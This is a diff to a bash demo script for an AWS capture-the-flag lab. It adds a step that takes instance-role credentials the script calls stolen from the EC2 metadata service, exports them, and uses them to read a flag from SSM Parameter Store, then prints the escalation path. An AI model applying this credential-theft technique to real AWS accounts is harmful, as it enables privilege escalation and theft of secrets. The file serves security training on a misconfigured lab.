@@ -237,6 +237,54 @@ aws ssm start-session \
 echo ""
 echo -e "${GREEN}✓ SSM session ended${NC}\n"
 
+# [EXPLOIT] Step 6: Retrieve CTF flag using stolen IMDS credentials
+# The IMDS credentials belong to the admin role (AdministratorAccess), which grants
+# ssm:GetParameter implicitly. Prompt the user to paste the stolen credentials so the
+# demo script can call ssm:GetParameter on their behalf.
+echo -e "${YELLOW}Step 6: Retrieving CTF flag using stolen admin credentials${NC}"
+echo ""
+echo -e "${BLUE}Paste the stolen credentials from the IMDS output above.${NC}"
+echo -e "${BLUE}Leave blank and press ENTER to skip the flag capture step.${NC}"
+echo ""
+
+echo -n "AccessKeyId: "
+read STOLEN_ACCESS_KEY
+echo -n "SecretAccessKey: "
+read STOLEN_SECRET_KEY
+echo -n "Token: "
+read STOLEN_SESSION_TOKEN
+
+FLAG_PARAM_NAME="/pathfinding-labs/flags/cspm-ec2-001-to-admin"
+
+if [ -n "$STOLEN_ACCESS_KEY" ] && [ -n "$STOLEN_SECRET_KEY" ] && [ -n "$STOLEN_SESSION_TOKEN" ]; then
+    export AWS_ACCESS_KEY_ID="$STOLEN_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$STOLEN_SECRET_KEY"
+    export AWS_SESSION_TOKEN="$STOLEN_SESSION_TOKEN"
+    export AWS_REGION=$AWS_REGION
+
+    echo ""
+    echo "Fetching flag from SSM: $FLAG_PARAM_NAME"
+    show_attack_cmd "Attacker (admin role via IMDS)" "aws ssm get-parameter --region $AWS_REGION --name \"$FLAG_PARAM_NAME\" --query 'Parameter.Value' --output text"
+    CTF_FLAG=$(aws ssm get-parameter \
+        --region "$AWS_REGION" \
+        --name "$FLAG_PARAM_NAME" \
+        --query 'Parameter.Value' \
+        --output text 2>/dev/null)
+
+    if [ -n "$CTF_FLAG" ] && [ "$CTF_FLAG" != "None" ]; then
+        echo -e "${GREEN}✓ CTF Flag retrieved: $CTF_FLAG${NC}"
+    else
+        echo -e "${YELLOW}Note: Could not retrieve CTF flag (flag may not be configured or credentials are invalid)${NC}"
+    fi
+
+    # Reset to demo user credentials after flag capture
+    use_demo_creds
+else
+    echo -e "${YELLOW}Skipping flag capture - no stolen credentials provided${NC}"
+    CTF_FLAG=""
+fi
+echo ""
+
 if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     echo -e "\n${YELLOW}Attack Commands:${NC}"
     for cmd in "${ATTACK_COMMANDS[@]}"; do
@@ -244,12 +292,25 @@ if [ ${#ATTACK_COMMANDS[@]} -gt 0 ]; then
     done
 fi
 
-# Step 6: Summarize the risk
+# Step 7: Risk summary
 echo -e "${CYAN}========================================${NC}"
 echo -e "${CYAN}CSPM MISCONFIGURATION RISK SUMMARY${NC}"
 echo -e "${CYAN}========================================${NC}"
 echo ""
 echo -e "${RED}FINDING:${NC} $CSPM_CHECK"
+echo ""
+echo -e "${YELLOW}Attack path completed:${NC}"
+echo "  pl-cspm-ec2-001-demo-user"
+echo "    --> ssm:StartSession"
+echo "  pl-cspm-ec2-001-instance (EC2)"
+echo "    --> IMDS credential extraction"
+echo "  pl-cspm-ec2-001-admin-role (AdminRole)"
+echo "    --> ssm:GetParameter"
+echo "  /pathfinding-labs/flags/cspm-ec2-001-to-admin (CTF Flag)"
+if [ -n "$CTF_FLAG" ]; then
+    echo ""
+    echo -e "${GREEN}CTF Flag: $CTF_FLAG${NC}"
+fi
 echo ""
 echo -e "${YELLOW}What this misconfiguration means:${NC}"
 echo "  - The EC2 instance has AdministratorAccess via its instance role"
